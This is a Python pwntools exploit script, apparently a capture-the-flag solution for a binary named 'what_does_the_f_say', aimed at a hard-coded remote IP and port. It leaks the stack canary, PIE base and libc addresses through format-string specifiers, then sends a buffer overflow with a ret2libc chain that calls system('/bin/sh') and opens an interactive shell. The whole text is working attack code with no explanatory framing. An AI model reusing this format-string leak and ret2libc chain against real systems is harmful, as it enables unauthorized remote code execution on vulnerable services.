from pwn import *

def get_pie_addr(io):
    io.send(b"1\n")
    io.send(b"2\n")

    io.clean()
    io.sendlineafter(b"Red or Green Kryptonite?\n" ,b"%15$p")
    pie_base = io.recv()
    pie_base = pie_base.split(b"\n")
    pie_base = pie_base[0]

    return int(pie_base, 16)

def get_canary_value(io):
    io.send(b"1\n")
    io.send(b"2\n")
    io.clean()

    io.sendlineafter(b"Red or Green Kryptonite?\n" ,b"%13$p")
    parse_this = io.recv()
    parse_this = parse_this.split(b"\n")

    return int(parse_this[0],16)

def grab_libc_start_main(io):
     io.send(b"1\n")
     io.send(b"2\n")
     io.clean()

     io.sendlineafter(b"Red or Green Kryptonite?\n" ,b"%25$p")
     parse_this = io.recv()
     parse_this = parse_this.split(b"\n")
     return hex(int(parse_this[0],16))
     
def exploit_bof(io, canary_value, payload):
     for i in range(3):
          io.send(b"2\n")
          io.send(b"3\n")
     io.send(b"1\n")
     io.send(b"2\n")
     io.sendlineafter(b"Red or Green Kryptonite?" ,b"1337")
     real_payload = b"\x90"*24
     real_payload += p64(canary_value)
     real_payload += p64(0xdeadbeefdeadbeef)
     real_payload += payload
     log.info(real_payload)
     io.wait(0.3)
     log.info(f"payload: {real_payload}")
     io.sendlineafter(b"you have less than 20 space rocks! Are you sure you want to buy it?" ,real_payload)
    # io.recvuntil(b">>")    
     io.interactive()
     
def libc_read(io):
    io.send(b"1\n")
    io.send(b"2\n")
    io.clean()
    io.sendlineafter(b"Red or Green Kryptonite?\n" ,b"%3$p")
    libc_addr_read = io.recv()
    libc_addr_read = libc_addr_read.split(b"\n")
    return int(libc_addr_read[0], 16)

if __name__ == "__main__": 
#  with process("./what_does_the_f_say") as proc:
      with remote("94.237.54.170",33327) as proc:

          # gdb.attach(proc)
           canary_val = get_canary_value(proc)
           elf_base = get_pie_addr(proc)
           libc_start_main = grab_libc_start_main(proc)
           read_addr = libc_read(proc)
           log.info(f"canary value: {get_canary_value (proc)}")
           log.info(f"libc_start_main: {libc_start_main}")
           log.info(f"pie base @ : {elf_base: 016x}") # :016x is a format string techniq
           log.info(f"libc read @: {read_addr: 016x}")
           libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6",checksec=False)

           elf_base = (elf_base &~ 0xFFF)
           proc.address = elf_base - 0x00000000001000

           libc.address = read_addr - 17 - libc.sym.read
           log.info(f"libc system: {libc.symbols[b'system']:016x}")

           ret2libc = p64(proc.address+0x18bb)
           ret2libc += p64(next(libc.search(b'/bin/sh')))
           ret2libc += p64(proc.address+0x1016)
           ret2libc += p64(libc.symbols[b'system'])
           ret2libc += p64(1337)
           exploit_bof(proc, canary_val, ret2libc)


'''
